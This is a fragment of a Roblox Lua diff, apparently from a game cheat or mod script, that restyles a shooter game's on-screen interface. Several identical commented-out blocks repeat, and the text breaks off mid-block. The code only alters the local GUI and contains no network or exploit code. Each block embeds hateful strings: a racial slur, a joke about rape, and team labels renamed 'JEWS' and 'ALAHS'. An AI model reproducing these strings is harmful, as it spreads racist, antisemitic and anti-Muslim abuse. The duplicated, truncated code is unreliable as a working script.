+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
